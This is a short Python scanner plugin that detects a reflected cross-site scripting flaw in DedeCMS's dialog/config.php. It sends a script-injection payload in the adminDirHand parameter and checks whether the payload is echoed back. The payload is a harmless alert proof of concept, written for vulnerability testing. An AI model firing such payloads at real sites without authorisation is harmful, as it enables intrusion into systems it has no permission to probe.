#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'
#SSV-ID: 61209
import re

def assign(service, arg):
    if service == "dedecms":
        return True, arg

def audit(arg):
    url = arg
    poc="/include/dialog/config.php?adminDirHand=</script><script>alert(1);</script>"
    code, head, body, errcode, _ = curl.curl(url+poc)
    if code == 200:
        m = re.search('\<script\>alert\(1\);\<\/script\>', body)
        if m:
            security_hole('xss detected')

if __name__ == '__main__':
    from dummy import *
    audit(assign('dedecms', 'http://localhost/dedecms/5.7/')[1])